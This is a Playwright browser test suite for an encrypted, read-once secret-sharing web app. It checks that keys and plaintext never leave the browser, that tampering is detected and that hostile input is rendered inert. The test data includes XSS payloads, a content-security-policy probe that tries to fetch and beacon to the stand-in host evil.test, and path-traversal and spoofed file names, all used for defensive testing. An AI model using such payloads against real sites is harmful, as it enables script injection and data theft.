#!/usr/bin/env python3
"""The real pages, in real browsers, against the real local server."""
from __future__ import annotations

import asyncio
import json
import os
import sys
import tempfile
import unicodedata
from pathlib import Path

from playwright.async_api import async_playwright

from common import Server, b64u, frame, open_binary, parse_link, seal, token_of, unique_ip, unseal, unseal_named

SECRET_TEXT = 'STRIPE_KEY=sk_live_CANARY$abc\nPW="pa$$word"\n日本語のメモ🔑\n'
HTML_TEXT = "<img src=x onerror=\"fetch('/pwned')\"><script>fetch('/pwned2')</script>"
PASS = "correct horse バッテリー"


class Page:
    """A browser context that remembers every request it made."""

    def __init__(self, browser, server, binary_open=False, **kw):
        self.browser, self.server, self.kw = browser, server, kw
        self.binary_open = binary_open
        self.requests = []

    async def __aenter__(self):
        self.ctx = await self.browser.new_context(extra_http_headers={"CF-Connecting-IP": unique_ip()}, **self.kw)
        if self.binary_open:
            await self.ctx.route("**/app.js", open_binary)
        self.page = await self.ctx.new_page()
        self.page.on("request", lambda r: self.requests.append(r))
        self.page.answers = []
        self.page.on("response", lambda r: self.page.answers.append((r.status, r.request.method)) if r.request.method == "POST" else None)
        return self

    async def __aexit__(self, *exc):
        await self.ctx.close()

    def posts(self):
        return [r for r in self.requests if r.method == "POST"]

    def foreign(self):
        return [r.url for r in self.requests if not r.url.startswith(self.server.base + "/")]


async def headers_of(request):
    """all_headers() is the accurate one, but WebKit can hang on it. r.headers still has these."""
    try:
        return await asyncio.wait_for(request.all_headers(), 3)
    except Exception:  # noqa: BLE001
        return request.headers


async def text_of(page, selector):
    return await page.locator(selector).first.text_content()


async def visible(page, selector):
    return await page.locator(selector).first.is_visible()


async def wait_visible(page, selector, timeout=15000):
    try:
        await page.locator(selector).first.wait_for(state="visible", timeout=timeout)
    except Exception as e:  # noqa: BLE001
        # Says what was on screen instead, because a rare failure may not come back to be looked at.
        shown = await page.evaluate("[...document.querySelectorAll('[id^=state-]')].filter(e => !e.hidden).map(e => e.id)")
        raise AssertionError(f"{selector} never appeared. On screen: {shown}. Answers: {getattr(page, 'answers', [])}") from e


async def make_link(browser, server, text, passphrase=None, ttl=None):
    async with Page(browser, server) as p:
        await p.page.goto(server.base + "/")
        await p.page.fill("#text", text)
        if passphrase:
            await p.page.fill("#passphrase", passphrase)
        if ttl:
            await p.page.select_option("#ttl", str(ttl))
        await p.page.click("#make")
        await wait_visible(p.page, "#result")
        link = await text_of(p.page, "#link")
        assert await p.page.input_value("#text") == "", "the secret stayed in the box"
        assert await p.page.input_value("#passphrase") == "", "the passphrase stayed in the box"
        assert p.foreign() == [], p.foreign()
        posts = p.posts()
        assert len(posts) == 1
        sent = posts[0].post_data or ""
        _, _, secret = parse_link(link)
        if len(text) >= 8:  # a shorter string can turn up in base64 by chance
            assert text[:12] not in sent, "plaintext was sent"
        assert b64u(secret) not in sent, "the key was sent"
        if passphrase:
            assert passphrase not in sent, "the passphrase was sent"
        assert all("#" not in r.url for r in p.requests), "fragment on the wire"
        for r in p.requests:
            assert "cookie" not in await headers_of(r), "cookie sent"
        return link


async def b_create_then_read_in_another_browser_context(browser, server):
    link = await make_link(browser, server, SECRET_TEXT)
    rid, version, secret = parse_link(link)
    assert version == "1"
    async with Page(browser, server) as p:
        await p.page.goto(link)
        await wait_visible(p.page, "#open")
        assert p.posts() == [], "opening the page must not read the record"
        await p.page.click("#open")
        await wait_visible(p.page, "#output")
        assert await text_of(p.page, "#output") == SECRET_TEXT
        assert "#" not in p.page.url, "the key is still in the address bar"
        assert p.foreign() == []
        sent = p.posts()[0].post_data or ""
        assert b64u(secret) not in sent, "the secret itself was sent"
        assert all(r.url.split("#")[0] == r.url for r in p.requests)
        for r in p.requests:
            assert b64u(secret) not in json.dumps(await headers_of(r)), "the secret went out in a header"
    async with Page(browser, server) as p:
        await p.page.goto(link)
        await p.page.click("#open")
        await wait_visible(p.page, "#state-gone")
        assert not await visible(p.page, "#output")


async def b_python_can_read_what_the_browser_wrote(browser, server):
    link = await make_link(browser, server, SECRET_TEXT)
    rid, _, secret = parse_link(link)
    status, _, out = server.open(rid, secret)
    assert status == 200
    assert unseal(json.loads(out), secret).decode() == SECRET_TEXT


async def b_the_browser_can_read_what_python_wrote(browser, server):
    rid, secret, link = server.create(SECRET_TEXT)
    async with Page(browser, server) as p:
        await p.page.goto(link)
        await p.page.click("#open")
        await wait_visible(p.page, "#output")
        assert await text_of(p.page, "#output") == SECRET_TEXT


async def b_passphrase_round_trip_in_both_directions(browser, server):
    link = await make_link(browser, server, SECRET_TEXT, passphrase=PASS)
    rid, version, secret = parse_link(link)
    assert version == "1p"
    async with Page(browser, server) as p:
        await p.page.goto(link)
        await wait_visible(p.page, "#read-passphrase")
        # An empty passphrase does not spend the one read.
        await p.page.click("#open")
        await wait_visible(p.page, "#err-passphrase")
        assert p.posts() == [], "read before a passphrase was given"
        # A wrong one costs the server copy, but not the attempt: it can be retried.
        await p.page.fill("#read-passphrase", "wrong")
        await p.page.click("#open")
        await wait_visible(p.page, "#err-passphrase")
        assert not await visible(p.page, "#output")
        await p.page.fill("#read-passphrase", PASS)
        await p.page.click("#open")
        await wait_visible(p.page, "#output", timeout=30000)
        assert await text_of(p.page, "#output") == SECRET_TEXT
        assert len(p.posts()) == 1, "the record was requested more than once"
    # Python reading a browser record, and the reverse.
    link = await make_link(browser, server, "from browser", passphrase=PASS)
    rid, _, secret = parse_link(link)
    record = json.loads(server.open(rid, secret)[2])
    assert unseal(record, secret, PASS) == b"from browser"
    try:
        unseal(record, secret, "wrong")
    except Exception:  # noqa: BLE001
        pass
    else:
        raise AssertionError("wrong passphrase decrypted")
    # Typed in a different Unicode form, as some keyboards and systems do. Must still match.
    rid, secret, link = server.create("from python", passphrase=PASS)
    async with Page(browser, server) as p:
        await p.page.goto(link)
        await p.page.fill("#read-passphrase", unicodedata.normalize("NFD", PASS))
        await p.page.click("#open")
        await wait_visible(p.page, "#output", timeout=30000)
        assert await text_of(p.page, "#output") == "from python"


async def b_a_key_alone_does_not_open_a_passphrase_link(browser, server):
    # Someone strips the "p" from the link to skip the prompt: the record says otherwise.
    rid, secret, link = server.create("guarded", passphrase=PASS)
    async with Page(browser, server) as p:
        await p.page.goto(link.replace("#1p.", "#1."))
        await p.page.click("#open")
        await wait_visible(p.page, "#state-error")
        assert not await visible(p.page, "#output")
        assert await text_of(p.page, "#output") == ""


async def b_html_in_a_secret_is_only_ever_text(browser, server):
    link = await make_link(browser, server, HTML_TEXT)
    async with Page(browser, server) as p:
        await p.page.goto(link)
        await p.page.click("#open")
        await wait_visible(p.page, "#output")
        assert await text_of(p.page, "#output") == HTML_TEXT
        await p.page.wait_for_timeout(300)
        assert not [r.url for r in p.requests if "pwned" in r.url or r.url.endswith("/x")], "markup ran"
        assert await p.page.locator("img").count() == 0


async def b_size_limits_match_the_server(browser, server):
    for size in [1, 1018, 1019, 4090, 4091, 16378, 16379, 65530]:
        link = await make_link(browser, server, "a" * size)
        rid, _, secret = parse_link(link)
        out = json.loads(server.open(rid, secret)[2])
        assert unseal(out, secret) == b"a" * size, size
    async with Page(browser, server) as p:
        await p.page.goto(server.base + "/")
        await p.page.fill("#text", "a" * 65531)
        await p.page.click("#make")
        await wait_visible(p.page, "#err-big")
        assert p.posts() == [], "oversized text was sent"
        await p.page.fill("#text", "")
        await p.page.click("#make")
        await wait_visible(p.page, "#err-empty")
        assert not await visible(p.page, "#err-big")
        assert p.posts() == []


async def b_every_ttl_choice_reaches_the_server(browser, server):
    for ttl in [600, 3600, 86400, 604800]:
        link = await make_link(browser, server, "x", ttl=ttl)
        rid, _, _ = parse_link(link)
        left = server.sql("SELECT expires_at - unixepoch() FROM secrets WHERE id = ?", rid)[0][0]
        assert ttl - 30 <= left <= ttl, (ttl, left)


async def b_inputs_do_not_invite_spellcheck_translation_or_autofill(browser, server):
    rid, secret, link = server.create("x", passphrase="p")
    fields = [("spellcheck", "false"), ("autocomplete", "off"), ("translate", "no")]
    async with Page(browser, server) as p:
        await p.page.goto(server.base + "/")
        for selector in ["#text", "#passphrase"]:
            for name, value in fields:
                assert await p.page.get_attribute(selector, name) == value, (selector, name)
        assert await p.page.get_attribute("#link", "translate") == "no"
        assert await p.page.get_attribute('meta[name="google"]', "content") == "notranslate"
        await p.page.goto(link)
        for name, value in fields:
            assert await p.page.get_attribute("#read-passphrase", name) == value, name
        assert await p.page.get_attribute("#output", "translate") == "no"
        # Secrets on screen are not form fields, because WebKit stores those in the history.
        assert await p.page.evaluate("document.getElementById('output').tagName") == "PRE"
        await p.page.goto(server.base + "/")
        assert await p.page.evaluate("document.getElementById('link').tagName") == "PRE"


async def b_nothing_is_left_in_browser_storage(browser, server):
    link = await make_link(browser, server, SECRET_TEXT, passphrase=PASS)
    async with Page(browser, server) as p:
        await p.page.goto(link)
        await p.page.fill("#read-passphrase", PASS)
        await p.page.click("#open")
        await wait_visible(p.page, "#output", timeout=30000)
        state = await p.page.evaluate(
            "async () => ({ls: localStorage.length, ss: sessionStorage.length, cookie: document.cookie,"
            " idb: indexedDB.databases ? (await indexedDB.databases()).length : 0})"
        )
        assert state == {"ls": 0, "ss": 0, "cookie": "", "idb": 0}, state
        assert await p.ctx.cookies() == []


async def b_the_content_security_policy_is_really_enforced(browser, server):
    async with Page(browser, server) as p:
        await p.page.goto(server.base + "/")
        out = await p.page.evaluate(
            """async () => {
              const result = {};
              try {
                const s = document.createElement('script');
                s.textContent = 'window.__inline = 1';
                document.head.append(s);
              } catch (e) { result.inlineThrew = e.name; }
              result.inline = window.__inline === 1;
              await new Promise((done) => {
                const s = document.createElement('script');
                try { s.src = 'https://evil.test/x.js'; } catch (e) { result.externalScript = 'blocked:' + e.name; done(); return; }
                s.onerror = () => { result.externalScript = 'blocked'; done(); };
                s.onload = () => { result.externalScript = 'loaded'; done(); };
                document.head.append(s);
                setTimeout(done, 1500);
              });
              try { await fetch('https://evil.test/c'); result.fetch = 'sent'; }
              catch (e) { result.fetch = 'blocked'; }
              await new Promise((done) => {
                const i = new Image();
                i.onerror = () => { result.image = 'blocked'; done(); };
                i.onload = () => { result.image = 'loaded'; done(); };
                i.src = 'https://evil.test/i.gif';
                setTimeout(done, 1500);
              });
              try { navigator.sendBeacon('https://evil.test/b', 'x'); } catch (e) { result.beaconThrew = e.name; }
              try { document.body.innerHTML = '<b>x</b>'; result.innerHTML = 'allowed'; }
              catch (e) { result.innerHTML = 'blocked:' + e.name; }
              return result;
            }"""
        )
        assert out["inline"] is False, out
        assert str(out["externalScript"]).startswith("blocked"), out
        assert out["fetch"] == "blocked", out
        assert out["image"] == "blocked", out
        await p.page.wait_for_timeout(200)
        assert [u for u in p.foreign() if "evil.test" in u and "c" == u[-1]] == [], p.foreign()


async def b_going_back_does_not_bring_the_secret_back(browser, server):
    # Hidden values count: WebKit restored a textarea here without showing it.
    rid, secret, link = server.create(SECRET_TEXT)
    async with Page(browser, server) as p:
        await p.page.goto(link)
        await p.page.click("#open")
        await wait_visible(p.page, "#output")
        await p.page.goto(server.base + "/")
        await p.page.go_back()
        await p.page.wait_for_timeout(500)
        assert await text_of(p.page, "#output") == "", "the secret came back from history"
        assert not await visible(p.page, "#state-shown")
        assert "CANARY" not in await p.page.content()


async def b_leaving_mid_typing_leaves_nothing_in_history(browser, server):
    async with Page(browser, server) as p:
        await p.page.goto(server.base + "/")
        await p.page.fill("#text", SECRET_TEXT)
        await p.page.fill("#passphrase", PASS)
        await p.page.goto(server.base + "/robots.txt")
        await p.page.go_back()
        await p.page.wait_for_timeout(500)
        assert await p.page.input_value("#text") == "", "typed secret came back from history"
        assert await p.page.input_value("#passphrase") == "", "typed passphrase came back from history"


async def b_a_made_link_does_not_survive_in_history(browser, server):
    async with Page(browser, server) as p:
        await p.page.goto(server.base + "/")
        await p.page.fill("#text", "x" * 20)
        await p.page.click("#make")
        await wait_visible(p.page, "#result")
        await p.page.goto(server.base + "/robots.txt")
        await p.page.go_back()
        await p.page.wait_for_timeout(500)
        assert await text_of(p.page, "#link") == "", "the link came back from history"


async def b_a_typed_passphrase_does_not_survive_in_history(browser, server):
    rid, secret, link = server.create("x", passphrase=PASS)
    async with Page(browser, server) as p:
        await p.page.goto(link)
        await p.page.fill("#read-passphrase", PASS)
        await p.page.goto(server.base + "/robots.txt")
        await p.page.go_back()
        await p.page.wait_for_timeout(500)
        assert await p.page.input_value("#read-passphrase") == "", "the passphrase came back"
    assert server.open(rid, secret)[0] == 200


async def b_reloading_after_reading_shows_nothing(browser, server):
    rid, secret, link = server.create(SECRET_TEXT)
    async with Page(browser, server) as p:
        await p.page.goto(link)
        await p.page.click("#open")
        await wait_visible(p.page, "#output")
        await p.page.reload()
        await wait_visible(p.page, "#state-badlink")
        assert await text_of(p.page, "#output") == ""


async def b_clear_button_removes_it_from_the_screen(browser, server):
    rid, secret, link = server.create(SECRET_TEXT)
    async with Page(browser, server) as p:
        await p.page.goto(link)
        await p.page.click("#open")
        await wait_visible(p.page, "#clear-output")
        await p.page.click("#clear-output")
        await wait_visible(p.page, "#cleared")
        assert await text_of(p.page, "#output") == ""
        assert not await visible(p.page, "#gone-why")


async def b_a_preview_bot_that_runs_javascript_does_not_burn_it(browser, server):
    rid, secret, link = server.create(SECRET_TEXT)
    async with Page(browser, server) as bot:
        await bot.page.goto(link)
        await wait_visible(bot.page, "#open")
        await bot.page.wait_for_timeout(500)
        assert bot.posts() == []
    assert server.sql("SELECT COUNT(*) FROM secrets WHERE id = ?", rid)[0][0] == 1
    assert server.open(rid, secret)[0] == 200


async def b_broken_links_say_so_and_request_nothing(browser, server):
    rid, secret, link = server.create("x")
    base = f"{server.base}/s/{rid}"
    for suffix in ["", "#", "#1.", "#1.short", "#2." + b64u(secret), "#1." + b64u(secret) + "x", "#1p." + b64u(secret)[:-1]]:
        async with Page(browser, server) as p:
            await p.page.goto(base + suffix)
            await wait_visible(p.page, "#state-badlink")
            assert p.posts() == [], suffix
            assert not await visible(p.page, "#open"), suffix
    assert server.open(rid, secret)[0] == 200, "a broken link consumed the record"


async def b_a_tampered_record_shows_an_error_and_no_text(browser, server):
    rid, secret, link = server.create(SECRET_TEXT)
    ct = server.sql("SELECT ct FROM secrets WHERE id = ?", rid)[0][0]
    server.sql("UPDATE secrets SET ct = ? WHERE id = ?", ("B" if ct[0] == "A" else "A") + ct[1:], rid)
    async with Page(browser, server) as p:
        await p.page.goto(link)
        await p.page.click("#open")
        await wait_visible(p.page, "#state-error")
        assert await text_of(p.page, "#output") == ""


async def b_padding_that_is_not_zero_is_refused(browser, server):
    # A correctly encrypted record from a sender who hides data in the padding.
    good = frame(None, b"x")
    padded = len(good).to_bytes(4, "big") + good + b"\0" * (1024 - 4 - len(good) - 1) + b"\x01"
    body, secret = seal(b"x", padded=padded)
    status, _, out = server.post("/api/s", body)
    assert status == 201
    rid = json.loads(out)["id"]
    async with Page(browser, server) as p:
        await p.page.goto(f"{server.base}/s/{rid}#1.{b64u(secret)}")
        await p.page.click("#open")
        await wait_visible(p.page, "#state-error")
        assert await text_of(p.page, "#output") == ""


async def b_a_lying_length_prefix_is_refused(browser, server):
    for declared in [1021, 2**32 - 1]:
        good = frame(None, b"x")
        padded = declared.to_bytes(4, "big") + good + b"\0" * (1024 - 4 - len(good))
        body, secret = seal(b"x", padded=padded)
        status, _, out = server.post("/api/s", body)
        assert status == 201
        rid = json.loads(out)["id"]
        async with Page(browser, server) as p:
            await p.page.goto(f"{server.base}/s/{rid}#1.{b64u(secret)}")
            await p.page.click("#open")
            await wait_visible(p.page, "#state-error")
            assert await text_of(p.page, "#output") == "", declared


async def b_a_server_lying_about_the_passphrase_flag_gets_nothing(browser, server):
    # The server says no passphrase is needed for a record made with one.
    rid, secret, link = server.create("guarded", passphrase=PASS)
    server.sql("UPDATE secrets SET pw = 0, salt = NULL WHERE id = ?", rid)
    async with Page(browser, server) as p:
        await p.page.goto(link)
        await p.page.fill("#read-passphrase", PASS)
        await p.page.click("#open")
        await wait_visible(p.page, "#state-error")
        assert await text_of(p.page, "#output") == ""


async def b_links_lead_only_to_this_site_or_the_site_with_ads(browser, server):
    rid, secret, link = server.create("x")
    async with Page(browser, server) as p:
        await p.page.goto(server.base + "/")
        hrefs = await p.page.eval_on_selector_all("a[href]", "els => els.map(e => e.getAttribute('href'))")
        site = {"https://apikeybin.com/privacy", "https://apikeybin.com/terms", "https://apikeybin.com/report"}
        assert {h for h in hrefs if not h.startswith("/")} == site, hrefs
        # Someone who has read a link and wants to make one goes to the site, not to the screen
        # without ads, whose only way in is on the site's own list of what it cannot protect.
        await p.page.goto(link)
        hrefs = await p.page.eval_on_selector_all("a[href]", "els => els.map(e => e.getAttribute('href'))")
        assert set(hrefs) == {"https://apikeybin.com/", "https://apikeybin.com/report"}, hrefs


async def b_requests_carry_no_referrer(browser, server):
    rid, secret, link = server.create("x")
    async with Page(browser, server) as p:
        await p.page.goto(link)
        await p.page.click("#open")
        await wait_visible(p.page, "#output")
        for r in p.requests:
            headers = await headers_of(r)
            assert "referer" not in headers, (r.url, headers.get("referer"))


async def b_the_stylesheet_really_applies_under_the_policy(browser, server):
    # A policy that blocked it would leave a working but unstyled page, which no other test notices.
    async with Page(browser, server) as p:
        await p.page.goto(server.base + "/")
        radius = await p.page.evaluate("getComputedStyle(document.getElementById('make')).borderRadius")
        assert radius not in ("", "0px"), radius
        width = await p.page.evaluate("[document.documentElement.scrollWidth, innerWidth]")
        assert width[0] <= width[1], width


def env_file(tmp, name=".env", data=None):
    path = Path(tmp) / name
    path.write_bytes(SECRET_TEXT.encode() if data is None else data)
    return path


async def b_a_file_goes_through_with_its_name_and_exact_bytes(browser, server):
    data = b'# comment\r\nSTRIPE_KEY=sk_live_CANARY$abc\r\nNAME="\xe6\x97\xa5\xe6\x9c\xac"\n'
    with tempfile.TemporaryDirectory() as tmp:
        path = env_file(tmp, ".env.local", data)
        async with Page(browser, server) as p:
            await p.page.goto(server.base + "/")
            await p.page.set_input_files("#file", str(path))
            await wait_visible(p.page, "#file-chip")
            assert await text_of(p.page, "#file-name") == ".env.local"
            assert not await visible(p.page, "#text"), "the file's content must not fill the box"
            assert await p.page.input_value("#text") == ""
            await p.page.click("#make")
            await wait_visible(p.page, "#result")
            link = await text_of(p.page, "#link")
            assert not await visible(p.page, "#file-chip")
            sent = p.posts()[0].post_data or ""
            assert ".env.local" not in sent, "the file name was sent in the clear"
            assert "CANARY" not in sent, "the content was sent in the clear"
            assert ".env.local" not in json.dumps(server.sql("SELECT * FROM secrets"))
    rid, _, secret = parse_link(link)
    # Python sees the same name and bytes.
    record = json.loads(server.open(rid, secret)[2])
    assert unseal_named(record, secret) == (".env.local", data)


async def b_a_received_file_can_be_saved_byte_for_byte(browser, server):
    data = b'STRIPE_KEY=sk_live_CANARY$abc\r\nKEEP=trailing \n'
    rid, secret, link = server.create(data, name=".env.production")
    async with Page(browser, server) as p:
        await p.page.goto(link)
        await p.page.click("#open")
        await wait_visible(p.page, "#output")
        assert await text_of(p.page, "#output-name") == ".env.production"
        assert await visible(p.page, "#hint-dot"), "all three browsers drop the leading dot, so the page must say so"
        assert not await visible(p.page, "#hint-txt")
        async with p.page.expect_download() as info:
            await p.page.click("#save-output")
        download = await info.value
        # Browsers may adjust a leading dot. The name must still be recognisable, and the bytes exact.
        assert "env.production" in download.suggested_filename, download.suggested_filename
        saved = await download.path()
        assert Path(saved).read_bytes() == data
        assert p.foreign() == [], p.foreign()


async def b_a_file_name_is_shown_as_text_and_no_name_saves_under_a_plain_one(browser, server):
    name = "<img src=x onerror=window.pwned=1>.env"
    rid, secret, link = server.create("x", name=name)
    async with Page(browser, server) as p:
        await p.page.goto(link)
        await p.page.click("#open")
        await wait_visible(p.page, "#output")
        assert await text_of(p.page, "#output-name") == name
        assert await p.page.locator("#output-name img").count() == 0
    rid, secret, link = server.create("no name")
    async with Page(browser, server) as p:
        await p.page.goto(link)
        await p.page.click("#open")
        await wait_visible(p.page, "#output")
        assert not await visible(p.page, "#output-file")
        assert not await visible(p.page, "#hint-dot") and not await visible(p.page, "#hint-txt")
        async with p.page.expect_download() as info:
            await p.page.click("#save-output")
        download = await info.value
        assert download.suggested_filename == "apikeybin.txt", download.suggested_filename
        assert Path(await download.path()).read_bytes() == b"no name"


async def b_the_longest_name_fits_on_a_phone(browser, server):
    name = "a" * 124 + ".env"
    rid, secret, link = server.create("KEY=x", name=name)
    async with Page(browser, server) as p:
        await p.page.set_viewport_size({"width": 360, "height": 740})
        await p.page.goto(link)
        await p.page.click("#open")
        await wait_visible(p.page, "#output")
        assert await text_of(p.page, "#output-name") == name
        assert await p.page.evaluate("document.documentElement.scrollWidth <= document.documentElement.clientWidth")


async def b_a_file_name_that_would_run_when_opened_is_saved_as_text(browser, server):
    for name in ["install.command", "run.bat", "page.html", "a.svg", "b.JS", "c.ps1", "d.py", "e.desktop", "f.fileloc", "g.inetloc", "h.unknown", ".zshrc", ".env.html", ".env.bat", "x.exe.local"]:
        rid, secret, link = server.create("echo hello", name=name)
        async with Page(browser, server) as p:
            await p.page.goto(link)
            await p.page.click("#open")
            await wait_visible(p.page, "#output")
            async with p.page.expect_download() as info:
                await p.page.click("#save-output")
            suggested = (await info.value).suggested_filename
            assert suggested.endswith(".txt"), (name, suggested)
            assert await visible(p.page, "#hint-txt"), name
            assert await visible(p.page, "#hint-dot") == name.startswith("."), name


async def b_the_names_people_really_send_keep_their_name(browser, server):
    # The browser may still drop a leading dot. What matters is that nothing is added.
    for name in [".env", ".env.local", ".env.production", "app.env", "service-account.json", "config.yaml", "id_rsa", "a.pem", "b.KEY", "notes.txt", "credentials",
                 "cert.p12", "key.pfx", "release.jks", "my.keystore", "ca.der", "ca.cer", "ca.crt", "key.gpg", "key.asc", "id.ppk", "vault.kdbx"]:
        rid, secret, link = server.create("x", name=name)
        async with Page(browser, server) as p:
            await p.page.goto(link)
            await p.page.click("#open")
            await wait_visible(p.page, "#output")
            assert not await visible(p.page, "#hint-txt"), name
            async with p.page.expect_download() as info:
                await p.page.click("#save-output")
            suggested = (await info.value).suggested_filename
            assert not suggested.endswith(".txt") or name.endswith(".txt"), (name, suggested)


async def b_a_byte_order_mark_stays_in_the_content_and_is_refused_in_a_name(browser, server):
    data = b"\xef\xbb\xbfKEY=x\n"
    rid, secret, link = server.create(data, name="a.env")
    async with Page(browser, server) as p:
        await p.page.goto(link)
        await p.page.click("#open")
        await wait_visible(p.page, "#output")
        assert (await p.page.locator("#output").text_content()).encode() == data, "what is copied differs from the file"
        async with p.page.expect_download() as info:
            await p.page.click("#save-output")
        assert Path(await (await info.value).path()).read_bytes() == data


async def b_saving_after_the_page_has_wiped_itself_writes_nothing(browser, server):
    rid, secret, link = server.create("x", name="a.env")
    async with Page(browser, server) as p:
        await p.page.goto(link)
        await p.page.click("#open")
        await wait_visible(p.page, "#output")
        downloads = []
        p.page.on("download", lambda d: downloads.append(d))
        await p.page.evaluate("window.dispatchEvent(new Event('beforeunload'))")
        await p.page.click("#save-output")
        await p.page.wait_for_timeout(400)
        assert downloads == [], "a file was saved with nothing to put in it"


async def b_hostile_file_names_are_refused(browser, server):
    for name in ["../../evil", "a/b", "a\\b", "C:evil", "a\u202egpj.exe", "a\u200bb", "a\nb", "a\u0000b", "..", "x" * 129, "a.html.", "a.exe ", " a", "a\u3000", "\ufeff.env", "a\u00adb", "a\ufe0fb", "a\u180eb"]:
        data = frame(name, b"content")
        padded = len(data).to_bytes(4, "big") + data
        padded += b"\0" * (1024 - len(padded))
        body, secret = seal(b"x", padded=padded)
        status, _, out = server.post("/api/s", body)
        assert status == 201
        rid = json.loads(out)["id"]
        async with Page(browser, server) as p:
            await p.page.goto(f"{server.base}/s/{rid}#1.{b64u(secret)}")
            await p.page.click("#open")
            await wait_visible(p.page, "#state-error")
            assert await text_of(p.page, "#output") == "", repr(name)


async def b_only_files_of_the_right_size_are_taken(browser, server):
    with tempfile.TemporaryDirectory() as tmp:
        cases = [
            ("big.env", b"a" * 65537, "#err-big"),
            ("almost.env", b"a" * 65530, "#err-big"),
            ("empty.env", b"", "#err-empty"),
        ]
        for name, data, expected in cases:
            async with Page(browser, server) as p:
                await p.page.goto(server.base + "/")
                await p.page.set_input_files("#file", str(env_file(tmp, name, data)))
                await p.page.wait_for_timeout(150)
                if expected in ("#err-empty", "#err-big") and name != "big.env":
                    await p.page.click("#make")
                await wait_visible(p.page, expected)
                assert p.posts() == [], name


async def b_the_largest_file_goes_through(browser, server):
    # 64 KiB less the two length fields and the name.
    data = b"a" * (65536 - 4 - 2 - len("a.env"))
    with tempfile.TemporaryDirectory() as tmp:
        async with Page(browser, server) as p:
            await p.page.goto(server.base + "/")
            await p.page.set_input_files("#file", str(env_file(tmp, "a.env", data)))
            await wait_visible(p.page, "#file-chip")
            await p.page.click("#make")
            await wait_visible(p.page, "#result")
            link = await text_of(p.page, "#link")
    async with Page(browser, server) as p:
        await p.page.goto(link)
        await p.page.click("#open")
        await wait_visible(p.page, "#output")
        assert await text_of(p.page, "#output") == data.decode()
        async with p.page.expect_download() as info:
            await p.page.click("#save-output")
        download = await info.value
        assert download.suggested_filename == "a.env"
        assert Path(await download.path()).read_bytes() == data
    # And what Python wrote.
    rid, secret, link = server.create(data, name="a.env")
    async with Page(browser, server) as p:
        await p.page.goto(link)
        await p.page.click("#open")
        await wait_visible(p.page, "#output")
        assert await text_of(p.page, "#output") == data.decode()


BINARY = bytes(range(256)) * 3  # every byte value, so NUL and what is not UTF-8 are both in it


async def b_while_closed_a_file_that_is_not_text_is_refused_when_chosen(browser, server):
    with tempfile.TemporaryDirectory() as tmp:
        for name, data in [("cert.p12", BINARY), ("nul.txt", b"abc\x00def"), ("latin.env", b"PASSWORD=caf\xe9\n")]:
            async with Page(browser, server) as p:
                await p.page.goto(server.base + "/")
                await p.page.set_input_files("#file", str(env_file(tmp, name, data)))
                await wait_visible(p.page, "#err-binary")
                assert not await visible(p.page, "#file-chip"), name
                assert await visible(p.page, "#text"), name
                await p.page.click("#make")
                await wait_visible(p.page, "#err-empty")
                assert not await visible(p.page, "#err-binary"), name
                assert p.posts() == [], name
        # Text in any language still goes through, and a refusal does not stay on screen.
        async with Page(browser, server) as p:
            await p.page.goto(server.base + "/")
            await p.page.set_input_files("#file", str(env_file(tmp, "cert.p12", BINARY)))
            await wait_visible(p.page, "#err-binary")
            await p.page.set_input_files("#file", str(env_file(tmp, ".env", "NAME=日本語🔑\n".encode())))
            await wait_visible(p.page, "#file-chip")
            assert not await visible(p.page, "#err-binary")


async def b_the_button_waits_for_the_script(browser, server):
    async with Page(browser, server) as p:
        release = asyncio.Event()

        async def hold(route):
            await release.wait()
            await route.continue_()

        await p.ctx.route("**/app.js", hold)
        await p.page.goto(server.base + "/", wait_until="commit")
        await p.page.locator("#make").wait_for(state="visible", timeout=15000)
        assert await p.page.locator("#make").is_disabled(), "it can be pressed and nothing would happen"
        release.set()
        await p.page.fill("#text", "a" * 65531)
        await p.page.click("#make")
        await wait_visible(p.page, "#err-big")


async def b_a_file_that_cannot_be_read_says_so(browser, server):
    # A folder dragged in fails this way. So does a file moved after it was chosen.
    with tempfile.TemporaryDirectory() as tmp:
        async with Page(browser, server) as p:
            await p.page.add_init_script("Blob.prototype.arrayBuffer = () => Promise.reject(new DOMException('x', 'NotReadableError'));")
            await p.page.goto(server.base + "/")
            await p.page.set_input_files("#file", str(env_file(tmp)))
            await wait_visible(p.page, "#err-read")
            assert not await visible(p.page, "#file-chip")
            assert p.posts() == []


async def b_the_drop_zone_shows_where_a_file_can_be_dragged(browser, server):
    async def seen(p):
        await p.page.goto(server.base + "/")
        style = await p.page.evaluate("getComputedStyle(document.querySelector('.drop-zone')).borderTopStyle")
        return style, await visible(p.page, ".drag-hint")

    async with Page(browser, server) as p:
        assert await seen(p) == ("dashed", True)
    # Nothing to drag from on a phone. Firefox here has no phone mode.
    if browser.browser_type.name != "firefox":
        async with Page(browser, server, is_mobile=True, has_touch=True) as p:
            assert await seen(p) == ("none", False)


async def read_binary(p, link, name):
    await p.page.goto(link)
    await p.page.click("#open")
    await wait_visible(p.page, "#output-binary")
    assert not await visible(p.page, "#output-text"), name
    assert not await visible(p.page, "#copy-output"), name
    assert not await visible(p.page, "#hint-said"), name
    assert await text_of(p.page, "#output") == "", name
    async with p.page.expect_download() as info:
        await p.page.click("#save-output")
    download = await info.value
    return download.suggested_filename, Path(await download.path()).read_bytes()


async def b_a_binary_file_goes_through_byte_for_byte_and_is_only_saved(browser, server):
    with tempfile.TemporaryDirectory() as tmp:
        path = env_file(tmp, "cert.p12", BINARY)
        async with Page(browser, server, binary_open=True) as p:
            await p.page.goto(server.base + "/")
            await p.page.set_input_files("#file", str(path))
            await wait_visible(p.page, "#file-chip")
            await p.page.click("#make")
            await wait_visible(p.page, "#result")
            link = await text_of(p.page, "#link")
    async with Page(browser, server) as p:
        name, data = await read_binary(p, link, "cert.p12")
        assert await text_of(p.page, "#output-name") == "cert.p12"
        assert not await visible(p.page, "#hint-bin") and not await visible(p.page, "#hint-txt")
    assert name == "cert.p12", name
    assert data == BINARY


async def b_python_and_the_browser_agree_on_a_binary_file(browser, server):
    rid, secret, link = server.create(BINARY, name="key.jks")
    async with Page(browser, server) as p:
        name, data = await read_binary(p, link, "key.jks")
    assert (name, data) == ("key.jks", BINARY), name
    with tempfile.TemporaryDirectory() as tmp:
        path = env_file(tmp, "key.jks", BINARY)
        async with Page(browser, server, binary_open=True) as p:
            await p.page.goto(server.base + "/")
            await p.page.set_input_files("#file", str(path))
            await wait_visible(p.page, "#file-chip")
            await p.page.click("#make")
            await wait_visible(p.page, "#result")
            rid, _, secret = parse_link(await text_of(p.page, "#link"))
    assert unseal_named(json.loads(server.open(rid, secret)[2]), secret) == ("key.jks", BINARY)


